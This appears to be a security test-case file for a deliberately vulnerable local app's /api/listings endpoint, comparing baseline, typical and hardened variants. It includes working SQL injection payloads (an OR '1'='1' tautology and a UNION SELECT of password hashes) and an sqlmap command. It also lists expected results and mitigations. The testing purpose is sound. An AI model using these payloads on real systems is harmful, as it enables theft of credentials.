# T05 — SQL injection in /api/listings

## Wektor ataku
OWASP A03:2021 (Injection). Raw SQL with string interpolation in `?q=` query parameter.

## Setup
1. `git checkout baseline`
2. `pnpm dev`

## Payload
```bash
curl "http://localhost:3000/api/listings?q=%25%27%20OR%20%271%27%3D%271"
# decoded: q=%' OR '1'='1
curl "http://localhost:3000/api/listings?q=%25%27%20UNION%20SELECT%20password_hash%20FROM%20users--%20"
```

Or with sqlmap:
```bash
sqlmap -u "http://localhost:3000/api/listings?q=1" --dbs --batch
```

## Expected result per variant
- **baseline:** UNION-based attack returns rows from `users` table (incl. password hashes/plain text)
- **typical:** Drizzle parameterized query — payload becomes literal LIKE pattern, no rows
- **hardened:** + Zod max length 100 — payload too short to do damage even if filter slipped

## Verification tools
- sqlmap
- Manual curl

## Mitigation reference
`typical`/`hardened`: `src/app/api/listings/route.ts` uses Drizzle query builder.
